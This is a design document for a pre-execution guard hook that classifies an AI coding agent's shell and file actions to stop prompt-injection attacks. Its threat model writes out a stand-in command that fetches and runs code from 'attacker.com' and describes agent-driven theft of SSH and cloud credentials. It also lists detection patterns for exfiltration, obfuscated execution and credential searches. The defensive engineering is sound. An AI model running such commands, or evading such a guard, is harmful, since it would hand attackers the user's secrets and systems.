# shush Architecture and Design

## 1. Why shush

### Threat model

shush defends against a Claude Code session that has been given
malicious instructions, whether by prompt injection, a compromised
tool, or an attacker-controlled repository. The concrete threats:

- **Prompt-injected Bash**: a web page or file contains instructions
  that cause Claude to execute `curl attacker.com | bash` or similar.
- **Exfiltration**: piping credential files (`~/.ssh/id_rsa`,
  `~/.aws/credentials`) to a network sink.
- **Credential theft**: reading or writing secrets, tokens, and
  private keys.
- **Hook tampering**: modifying `~/.claude/hooks/` to disable or
  replace shush itself.
- **Supply-chain attack via `.shush.yaml`**: a malicious project
  config that attempts to loosen policies for dangerous commands.

### Non-goals

shush is **not** a sandbox. It does not prevent a permitted command
from having unintended side effects, does not intercept running
processes, and does not monitor network traffic. It acts
pre-execution: once a command is allowed, it runs unimpeded.

### Design stance

Three principles follow from the threat model:

1. **Data-driven**: all classification rules live in `data/classify_full/`
   JSON files. No policy is hardcoded in TypeScript outside of a few
   foundational constants derived from those files at build time. This
   makes coverage auditable without reading code.

2. **Formally verified**: security invariants are expressed as Z3 SMT
   proofs that must return `unsat` on their negations. A proof that
   passes is a machine-checked certificate that the invariant holds for
   all inputs, not just the ones covered by unit tests.

3. **Fail closed**: parse failures, config errors, and hook crashes all
   produce a `deny` output. shush never fails open.

---

## 2. Architecture at a glance

```
stdin (JSON HookInput)
  |
  v
hooks/pretooluse.ts  main()
  |-- readStdin()        JSON parse -> HookInput
  |-- loadConfig()       merge ~/.config/shush/config.yaml + .shush.yaml
  |-- evaluate()         src/evaluate.ts
  |     |
  |     +-- toolName == "Bash" -----> classifyCommand()  src/bash-guard.ts
  |     |                               |
  |     |                               +-- extractProcessSubs()
  |     |                               +-- extractStages()       src/ast-walk.ts
  |     |                               +-- shell unwrap loop
  |     |                               +-- classifyStage() x N
  |     |                               |     |-- checkFlagRules()
  |     |                               |     |-- lookup()         classifiers/
  |     |                               |     +-- classifyTokens() trie
  |     |                               +-- checkComposition()     src/composition.ts
  |     |                               +-- stricter() aggregation
  |     |
  |     +-- toolName in file tools ---> checkPath()             src/path-guard.ts
  |     |   (Read/Write/Edit/Glob/      checkProjectBoundary()
  |     |    Grep/MultiEdit/            scanContent()           src/content-guard.ts
  |     |    NotebookEdit)
  |     |
  |     +-- toolName starts mcp__ ----> deny_tools / allow_tools / mcp_path_params
  |
  v
Decision: allow | context | ask | block
  |
  v
toPermissionDecision()
  allow/context -> exit 0, no stdout (silent pass-through)
  ask           -> HookOutput { permissionDecision: "ask" }
  block         -> HookOutput { permissionDecision: "deny" }
```

The crash handler at the bottom of `pretooluse.ts:51` catches any
unhandled rejection and emits `permissionDecision: "deny"` before
exiting, ensuring a hook crash cannot be mistaken for allow.

---

## 3. The decision lattice

### Four levels

```
allow < context < ask < block
```

`allow` means silent pass-through. `context` means pass-through but
the decision is logged when `SHUSH_DEBUG` is set (reserved for
informational classifications). `ask` means Claude Code shows a
confirmation prompt. `block` maps to `deny` on the wire.

### `stricter()` as a semilattice join

`src/types.ts:47`:

```typescript
export function stricter(a: Decision, b: Decision): FinalDecision {
  return (STRICTNESS[a] >= STRICTNESS[b] ? a : b) as FinalDecision;
}
```

`STRICTNESS` maps `allow=0, context=1, ask=2, block=3`. `stricter(a,b)`
returns the element with the higher STRICTNESS value.

This is a join operation on the total order: commutative, associative,
and idempotent. Proofs L1-L5 in `test/z3-proofs/lattice.ts` verify
these algebraic properties symbolically.

### Wire mapping

`toPermissionDecision()` at `src/types.ts:59` maps the internal
four-level Decision to the three-level Claude Code hook contract:

| Internal | Wire |
|----------|------|
| `allow` | `"allow"` |
| `context` | `"allow"` (silent pass-through) |
| `ask` | `"ask"` |
| `block` | `"deny"` |

### Monotonicity invariant

Every aggregation point in the pipeline calls `stricter()`. No layer
can produce a result less strict than what a previous layer already
decided. This is proved by E3/E4 in `test/z3-proofs/equivalence.ts`.

---

## 4. Classification model

### The 22 action types

Defined in `data/types.json` (single source of truth). TypeScript
derives `ActionType` from its keys at compile time
(`src/types.ts:7`). Any mismatch between the JSON and the type system
fails at startup.

**Filesystem** (operations on files and directories):

| Type | Default | Description |
|------|---------|-------------|
| `filesystem_read` | allow | Read files or list directories |
| `filesystem_write` | context | Create or modify files |
| `filesystem_delete` | context | Delete files or directories |

**Git**:

| Type | Default | Description |
|------|---------|-------------|
| `git_safe` | allow | Read-only git operations (status, log, diff) |
| `git_write` | allow | Modify working tree or index |
| `git_discard` | ask | Discard uncommitted changes |
| `git_history_rewrite` | ask | Force push, rebase -i |

**Network**:

| Type | Default | Description |
|------|---------|-------------|
| `network_outbound` | context | Outbound requests (curl, wget, ssh) |
| `network_write` | ask | POST/PUT/DELETE/PATCH requests |
| `network_diagnostic` | allow | Read-only probes (ping, dig, traceroute) |

**Package management**:

| Type | Default | Description |
|------|---------|-------------|
| `package_install` | allow | Install packages |
| `package_run` | allow | Run package scripts (npm run, npx, just) |
| `package_uninstall` | ask | Remove packages |

**Execution**:

| Type | Default | Description |
|------|---------|-------------|
| `script_exec` | context | Run a script file via an interpreter |
| `lang_exec` | ask | Execute code inline (python -c, node -e) |
| `process_signal` | ask | Send signals (kill, pkill) |

**Container / disk / DB**:

| Type | Default | Description |
|------|---------|-------------|
| `container_destructive` | ask | docker rm, kubectl delete, etc. |
| `disk_destructive` | ask | dd, mkfs, fdisk, mount |
| `db_read` | allow | SELECT, introspection |
| `db_write` | ask | INSERT, UPDATE, DELETE, DROP, ALTER |

**Meta**:

| Type | Default | Description |
|------|---------|-------------|
| `obfuscated` | block | Encoded commands (base64 \| bash) |
| `unknown` | ask | Not in any classify table |

### Trie and longest-prefix match

`scripts/build-trie.ts` reads every JSON file under
`data/classify_full/` at build time and compiles them into a
nested prefix trie stored at `data/classifier-trie.json`.

At runtime, `trieLookup()` in `src/taxonomy.ts:58` walks the trie
token by token, tracking the deepest node that carries an action type
(`_` key). This implements longest-prefix match: `["git", "push",
"--force"]` matches the more specific `git_history_rewrite` prefix
before the shorter `git_write` prefix.

`classifyTokens()` at `src/taxonomy.ts:166` is the public entry point
for trie lookup with config-aware fallback.

### Flag-aware classifiers

The trie handles positional prefixes. Flag-aware classifiers handle
cases where the action type depends on which flags are present. They
are registered in `src/classifiers/`:

| File | CLI covered |
|------|-------------|
| `curl.ts` | curl (GET vs POST/PUT/DELETE) |
| `wget.ts` | wget (download vs POST) |
| `git.ts` | git (dangerous `-c` config injection) |
| `find.ts` | find (`-delete`, `-exec`) |
| `tar.ts` | tar (extract vs create, path traversal) |
| `tee.ts` | tee (write emitter) |
| `httpie.ts` | http/https (method detection) |
| `gh-api.ts` | gh api (method detection) |
| `inline-code.ts` | python/node -c/-e (inline code flag) |
| `script-exec.ts` | script file execution fallback |

`src/classifiers/index.ts` exports `lookup()`, which the bash
pipeline calls before falling back to the trie.

### Policy resolution

After classification produces an action type, `getPolicy(actionType,
config)` at `src/taxonomy.ts:122` resolves it to a Decision:

1. Check `config.actions[actionType]` (user override).
2. Fall back to `DEFAULT_POLICIES[actionType]` from `data/policies.json`.

Config overrides can only tighten (the merge enforces this). See
section 9.

---

## 5. Bash pipeline semantics

`classifyCommand()` at `src/bash-guard.ts:301` is the entry point.
It returns a `ClassifyResult` containing the final decision, the
dominant action type, and a human-readable reason.

### Process-substitution extraction (`src/bash-guard.ts:320`)

If the command string contains `>(` or `<(`, `extractProcessSubs()`
replaces each process substitution with a placeholder and collects the
inner commands as `subs[]`. Inner commands are classified separately
after the main pipeline and can escalate the final decision.

### Stage extraction (`src/bash-guard.ts:324`)

`extractStages()` in `src/ast-walk.ts`:
- Extracts `$()` and backtick command substitutions, replacing them
  with `$__SHUSH_CMD_n` placeholders and collecting inner commands
  as `cmdSubs[]`.
- Parses the cleaned string with `unbash` into a shell AST. Falls
  back to quote-aware splitting on parse error (`fallbackSplit`).
- Walks the AST to produce `Stage[]` — one per pipeline stage — each
  with `tokens[]`, `operator`, optional `redirectTarget`, and
  optional `envAssignments`.

### Shell unwrapping (`src/bash-guard.ts:328`)

`MAX_UNWRAP_DEPTH = 3` (`src/bash-guard.ts:17`).

If the entire command is a single stage whose first token is a shell
wrapper (`bash`, `sh`, `dash`, `zsh`, `pwsh`, `powershell` —
`src/taxonomy.ts:128`), `classifyCommand` recurses on the inner
command string. This handles `bash -c '...'`, `sh -c '...'`, etc.
Depth is bounded to prevent DoS from deeply nested wrappers.

### Per-stage classification (`src/bash-guard.ts:342`)

For each stage, before calling `classifyStage()`:

1. **Shell -c unwrapping** (checked first, `src/bash-guard.ts:351`):
   if the stage's first token is a shell wrapper with `-c`, recurse.
2. **Command wrapper unwrapping** (`src/bash-guard.ts:367`):
   iteratively strips wrappers defined in `COMMAND_WRAPPERS`
   (`src/predicates/composition.ts:153`): `xargs`, `nice`, `nohup`,
   `timeout`, `stdbuf`, `ionice`, `env`, `command`, `sudo`, `doas`,
   `busybox`, `entr`, `watchexec`, `pwsh`, `powershell`.
3. **Post-wrapper shell -c re-check** (`src/bash-guard.ts:380`):
   catches `sudo bash -c '...'` revealed after unwrapping.
4. **Docker delegation** (`src/bash-guard.ts:396`): `docker exec` and
   `docker run` extract the inner command and classify it recursively.
5. **Basename normalization** (`src/bash-guard.ts:374`):
   `/usr/bin/curl` -> `curl`.

Then `classifyStage()` at `src/bash-guard.ts:228` runs a 4-step
priority sequence, returning the first match:

```
1. checkDangerousGitConfig()   git -c core.hookspath=... and similar
2. checkFlagRules()            data-driven flag rules
3. lookup()                    procedural classifier registry
4. classifyTokensFull()        trie longest-prefix match
   + classifyScriptExec()      fallback for ./script.sh patterns
```

**Post-classification augmentations** per stage:

- **Exec-sink env vars**: `PAGER=malicious git log` escalates the
  stage to `lang_exec` policy.
- **Redirect targets**: `cmd > file` applies `filesystem_write` +
  `checkPath` on the target path.
- **Git -C paths**: `git -C /path` runs `checkPath` on the directory.
- **Write-emitter path args**: commands in `WRITE_EMITTERS` (derived
  from `data/classify_full/` by `writeEmittersFromData()`) have
  their positional path arguments checked against sensitive dirs.

### Aggregation (`src/bash-guard.ts:411+`)

All `StageResult` decisions are reduced with `stricter()`. Composition
can escalate further. Process subs and command subs are recursively
classified and folded in. The final `ClassifyResult.finalDecision` is
the result of this full chain.

---

## 6. Composition rules

`checkComposition()` at `src/composition.ts:26` scans the sequence of
`StageResult` values, tracking cumulative data-flow properties across
operators.

Pipe operators (`|`) carry stdin left-to-right. Non-pipe operators
(`&&`, `||`, `;`) do not carry stdin but can smuggle data via
filesystem side-effects. shush persists accumulator flags across
non-pipe operators and downgrades the decision from `block` to `ask`
for indirect flow.

The five rules applied to every consecutive pair:

| Pattern | Pipe | Non-pipe | Rule name |
|---------|------|----------|-----------|
| sensitive_read then network | block | block | `sensitive_read \| network` |
| network then exec_sink | block | ask | `network \| exec` |
| decode then exec_sink | block | ask | `decode \| exec` |
| any_read then exec_sink | ask | ask | `any_read \| exec` |

The "exec" rules are suppressed when the exec sink has an inline code
flag (`-c`, `-e`, `--eval`): in that case stdin is data, not code, so
no RCE is possible through stdin.

Decode commands: `base64 -d`, `openssl base64 -d`, `xxd -r`, and
similar — defined in `DECODE_COMMANDS` in `src/taxonomy.ts:147`.

---

## 7. Non-Bash tools

### `src/path-guard.ts`

`checkPath()` at `src/path-guard.ts:13` runs for every non-Bash file
tool and for Bash redirect targets. Steps:

1. **Hook path detection** (`isHookPath()`): if the resolved path is
   under `~/.claude/hooks/`, write tools get `block`, read-only tools
   get `allow` (silent), and `Bash` gets `ask`.
2. **Sensitive path lookup** (`isSensitive()`): checks the resolved
   path against `SENSITIVE_DIRS` (from `src/predicates/path.ts`)
   and user-configured `sensitivePaths`. Returns the matching
   policy (`block` or `ask`).
3. **`~user/...` path handling**: `~root/.ssh` is normalized to
   `~/.ssh` for sensitive-dir matching.

`checkProjectBoundary()` at `src/path-guard.ts:69` returns `ask` if
the resolved path is outside the project root (as reported by
`cwd` in the hook input). Paths in `config.allowedPaths` are exempt.
Symlinks are resolved via `resolveReal()` before comparison.

### `src/content-guard.ts`

`scanContent()` at `src/content-guard.ts:74` scans Write/Edit payloads
for dangerous patterns. Scan size is capped at `MAX_SCAN_BYTES`
(256 KB at `src/content-guard.ts:68`) for categories with backtracking
regexes (`exfiltration`, `obfuscation`). Cheap patterns (secrets,
destructive) scan the full content.

`CONTENT_PATTERNS` at `src/content-guard.ts:16` covers:

- `destructive`: `rm -rf`, `shutil.rmtree`, `os.remove`
- `exfiltration`: `curl -d @-`, `wget --post-data`, netcat pipes
- `obfuscation`: `base64 | bash`, `eval $(...)` patterns
- `secrets`: private key headers, AWS key format, GitHub tokens, JWTs

`isCredentialSearch()` at `src/content-guard.ts:101` checks Grep
patterns against `CREDENTIAL_SEARCH_PATTERNS` (password, secret,
token, api_key, private_key, AWS_SECRET, BEGIN.*PRIVATE).

---

## 8. The parity invariant

**Invariant**: the Bash tool must enforce the same path restrictions as
the equivalent file tool.

- `cat ~/.ssh/id_rsa` must receive at least the same decision as
  `Read ~/.ssh/id_rsa`.
- `echo key >> ~/.aws/credentials` must receive at least the same
  decision as `Write ~/.aws/credentials`.

This prevents an attacker from bypassing path-guard by wrapping a
sensitive read/write in a shell command.

Proved by E1 and E2 in `test/z3-proofs/equivalence.ts`:

- **E1**: Bash redirect to sensitive path >= Write to same path.
  `stricter(baseCmd, pathPolicy) >= pathPolicy` is always true, so
  the redirect decision cannot be less strict than the Write decision.
- **E2**: `cat` of sensitive path >= `Read` of same path.
  `filesystem_read` is `allow` (0), so
  `stricter(allow, pathPolicy) = pathPolicy = readDecision`.

Extended parity proofs in `test/z3-proofs/equiv-extended.ts` cover
`tee`, `cp`, `mv`, and `chmod` on sensitive paths (EX1-EX4).

Property tests in `test/property.test.ts` (describe blocks
"BG property: Read/cat and Write/redirect equivalence") exercise
the same invariant with randomized inputs against the real
`evaluate()` implementation.

---

## 9. Configuration model

Two config files, merged at runtime by `loadConfig()` in
`src/config.ts:408`:

- **Global**: `~/.config/shush/config.yaml` — can loosen or tighten.
- **Project**: `.shush.yaml` in the project root — can only tighten.

`parseConfigYaml()` at `src/config.ts:19` parses each file using the
minimal YAML parser in `src/mini-yaml.ts`. Malformed YAML logs a
warning to stderr (`shush: malformed config YAML, ignoring: <err>`)
and returns `EMPTY_CONFIG`, falling through to defaults.

`mergeConfigs()` at `src/config.ts:178` merges a base config with an
overlay, applying `stricter()` on each action type and sensitive path
to ensure the overlay cannot loosen a decision.

`filterClassifyTightenOnly()` at `src/config.ts:360` filters project
`classify` entries before merge: any entry that would reclassify a
command to a less-strict action type than the trie's base
classification is silently dropped (with a stderr warning). This
enforces that `.shush.yaml` cannot allowlist dangerous commands.

Loosening-only fields (`allowTools`, `allowedPaths`) are zeroed out
for the project config before the merge (`src/config.ts:449`).

For the full YAML schema and examples, see `docs/configuration.md`.

---

## 10. Testing strategy — three layers

### Layer 1: unit tests

Concrete input/output pairs. Cover specific commands, flag
combinations, and path patterns. Located in `test/*.test.ts`. Run
with `bun test`.

### Layer 2: property-based tests

`test/property.test.ts` uses `fast-check` to generate randomized
inputs and verify behavioral invariants against the real `evaluate()`
implementation. Each property is a universally-quantified statement
("for all sensitive paths, the decision is never allow").

Key suites:

- `PG property:` — path-guard invariants (sensitive paths, hook
  protection, credential search, boundary).
- `BG property:` — bash-guard invariants (exfil always blocks, RCE
  always blocks, shell wrapper never downgrades, parity).
- `M1`: shell unwrapping never downgrades a decision.
- `M2`: config action overrides cannot loosen sensitive-path
  decisions.
- `M4`: hook self-protection across all tools and Bash.
- `META`: path-check coverage invariant.

### Layer 3: Z3 formal proofs

SMT proofs using z3-solver (WASM, run under `npx tsx`). Each proof
file exports a `main()` that encodes a model, asserts the negation of
the invariant, and calls `report(id, await solver.check())`. A
passing proof returns `unsat` — no counterexample exists in the
entire symbolic input space.

The runner `test/z3-run.ts` executes each proof file via
`execFileSync("npx", ["tsx", proofFile])` and parses the JSON output
lines. Test files wrap proof files via the `bun test` harness.

Run only Z3 tests: `bun test --grep z3`.

---

## 11. Z3 proof catalogue

Proof files live under `test/z3-proofs/`. Each has a corresponding
`test/z3-*.test.ts` wrapper.

**B1-B5 (bypass)** — `test/z3-proofs/bypass.ts`, wrapper
`test/z3-bypass.test.ts`:
PathGuard invariants. Proves that no combination of path category and
tool type yields `allow` for hook writes (B1), that hook write tools
always get block (B2), that sensitive-block paths always get block
(B3), that outside-boundary writes are never allow (B4), and that
sensitive-ask paths never get allow (B5).

**C1-C4 (completeness)** — `test/z3-proofs/completeness.ts`, wrapper
`test/z3-completeness.test.ts`:
Every input maps to exactly one valid Decision. C1: every action type
in `policies.json` maps to a value in `[0,3]`. C2: every path/tool
combination produces a valid Decision. C3/C4: no gaps in the pipeline.

**E1-E4 (equivalence)** — `test/z3-proofs/equivalence.ts`, wrapper
`test/z3-equivalence.test.ts`:
Bash/file parity invariants (E1-E2) and `stricter()` algebraic
properties: commutativity (E3) and associativity (E4).

**EX1-EX4 (equiv-extended)** — `test/z3-proofs/equiv-extended.ts`,
wrapper `test/z3-equiv-extended.test.ts`:
Extended parity: `tee` to sensitive >= Write to sensitive (EX1), `cp`
(EX2), `mv` (EX3), `chmod` (EX4).

**X1-X6 (composition)** — `test/z3-proofs/composition.ts`, wrapper
`test/z3-composition.test.ts`:
Pipe composition and escalation invariants. Covers all five
composition rules and their pipe/non-pipe operator variants.

**L1-L5 (lattice)** — `test/z3-proofs/lattice.ts`, wrapper
`test/z3-lattice.test.ts`:
Algebraic properties of the Decision semilattice: commutativity,
associativity, idempotency, monotonicity, and join-semilattice laws
for `stricter()`.

**D1-D9, M1/M2/M4 (dippy-gaps)** — `test/z3-proofs/dippy-gaps.ts`,
wrapper `test/z3-dippy.test.ts`:
Nine coverage gap proofs (D1-D9) plus invariants M1 (shell unwrapping
never downgrades), M2 (config overrides cannot loosen sensitive-path
decisions), and M4 (hook self-protection across all tools and Bash).

**TG1-TG3 (tool-guarantees)** — `test/z3-proofs/tool-guarantees.ts`,
wrapper `test/z3-tool-guarantees.test.ts`:
Per-tool decision guarantees: hook + write tool always blocks (TG1a),
hook + mcp_write always blocks (TG1b), hook + read tool always allows
(TG1c), etc.

**CS1 (config-safety)** — `test/z3-proofs/config-safety.ts`,
wrapper `test/z3-config-safety.test.ts`:
Config overlay cannot produce a decision less strict than the base
config on any action type.

**G4 (operator-reset)** — `test/z3-proofs/operator-reset.ts`,
wrapper `test/z3-operator-reset.test.ts`:
Non-pipe operators reset composition chain state correctly.

**G1, G7 (parity-writes, config-containment)** —
`test/z3-proofs/parity-writes.ts` and
`test/z3-proofs/config-containment.ts`, wrappers
`test/z3-parity-writes.test.ts` and
`test/z3-config-containment.test.ts`:
G1: write-emitter commands and sensitive paths produce >= the
corresponding Write-tool decision. G7: config containment — project
config cannot escape the global config's permission boundary.

**smoke** — `test/z3-proofs/smoke.ts`, wrapper
`test/z3-smoke.test.ts`:
Sanity checks that Z3 is operational and the helpers load correctly.

---

## 12. Auto-adaptation

The Z3 proofs and property tests automatically extract ground truth
from the data files at test time. If the data changes, the proofs
re-verify against the new values without manual updates.

`test/z3-helpers.ts:10` extracts `ACTION_TYPES` and `POLICIES` from
`data/policies.json`:

```typescript
export const ACTION_TYPES = Object.keys(policiesJson) as string[];
export const POLICIES: Record<string, number> = Object.fromEntries(
  Object.entries(policiesJson).map(([k, v]) => [k, D[v]]),
);
```

`test/z3-proofs/extract.ts` (`assertExtraction()` at line 33)
extracts `WRITE_EMITTERS` from `data/classify_full/` via
`writeEmittersFromData()`, `SENSITIVE_DIRS` from
`src/predicates/path.ts`, and `ACTION_TYPES` from `data/types.json`.
`assertExtraction()` throws loudly if any extraction is empty or
missing a reference entry. `scripts/verify-extract.ts` runs this
check in CI before the test suite.

`test/data-consistency.test.ts` enforces six cross-file invariants
across `data/*.json`:

1. Every action type in `classify_full/` exists in `policies.json`.
2. Every action type in `policies.json` exists in `types.json`.
3. Every action type in `policies.json` has at least one command mapping.
4. All policy values are valid Decisions.
5. No duplicate prefixes within a single command file.
6. Trie lookup matches raw data for every prefix.

---

## 13. Extending shush

### Add a new CLI classifier

1. Create `data/classify_full/<cmd>.json` with action-type keys and
   prefix arrays.
2. Run `bun run build` to rebuild the trie.
3. Add a unit test in `test/` verifying the new command maps to the
   expected action type.
4. If the CLI needs flag-aware classification (e.g., POST vs GET),
   add a classifier in `src/classifiers/`, register it in
   `src/classifiers/index.ts`, and add tests.

### Add a new action type

1. Add the key and description to `data/types.json`.
2. Add the key and default policy to `data/policies.json`.
3. Run `bun test --grep z3` — the C1 completeness proof will fail
   until the new type is covered by at least one command mapping.
   Add command mappings in `data/classify_full/`.
4. Re-run `bun test --grep z3` to confirm all proofs still pass.

### Add a new Z3 invariant

1. Write the proof in `test/z3-proofs/<name>.ts`, exporting a
   `main()` that calls `report(id, await solver.check())` for each
   sub-proof.
2. Add a `test/z3-<name>.test.ts` wrapper that calls `runProof()`.
3. Run `bun test --grep z3` to confirm the new proof passes.

### When changing decision logic

Whenever you modify `path-guard.ts`, `bash-guard.ts`,
`composition.ts`, or `evaluate.ts`:

1. Run `bun test --grep z3` to verify all Z3 proofs still hold.
2. Run `bun test` (full suite) to verify property tests pass.
3. If adding a new decision path, add a corresponding Z3 invariant
   before merging.

---

## 14. Failure modes and failsafe behavior

### Parse failures

`extractStages()` in `src/ast-walk.ts` falls back to
`fallbackSplit()` (quote-aware whitespace splitting) when `unbash`
throws. This ensures a parse failure never silently allows a command
— the fallback produces a conservative tokenization that the rest of
the pipeline classifies normally.

### Config errors

`parseConfigYaml()` at `src/config.ts:19` catches YAML parse
exceptions and returns `EMPTY_CONFIG`, logging to stderr. Individual
invalid entries (unknown action type, invalid decision value) are
skipped with a warning, leaving the rest of the config intact.
`loadConfigFile()` at `src/config.ts:331` returns `EMPTY_CONFIG` on
any file read error other than `ENOENT` (file not found returns null,
meaning "no config").

### Unknown tokens

`classifyTokens()` returns the `unknown` action type for any token
sequence that has no trie match and no script-exec fallback.
`DEFAULT_POLICIES["unknown"]` is `ask`, so unrecognized commands
prompt rather than allow.

### Hook crashes

`main().catch()` at `hooks/pretooluse.ts:51` catches any unhandled
rejection and writes:

```json
{ "hookSpecificOutput": { "hookEventName": "PreToolUse",
  "permissionDecision": "deny",
  "permissionDecisionReason": "shush: internal error: ..." } }
```

This is the failsafe: a crash is treated as `deny`, never as `allow`.
